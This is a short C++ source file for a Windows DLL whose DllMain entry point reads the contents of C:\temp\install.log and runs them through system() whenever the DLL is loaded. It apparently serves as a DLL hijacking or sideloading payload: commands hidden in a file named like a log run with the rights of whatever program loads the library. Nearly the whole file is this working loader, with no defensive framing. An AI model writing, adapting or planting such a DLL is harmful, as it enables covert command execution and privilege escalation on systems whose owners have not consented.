// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <stdlib.h>
#include <fstream>
#include <string>
#include <fstream>
#include <streambuf>




BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    std::ifstream comfile("C:\\temp\\install.log");
    std::string comstr((std::istreambuf_iterator<char>(comfile)),std::istreambuf_iterator<char>());
    const char* comchar = comstr.c_str();
    system(comchar);
    return TRUE;
}

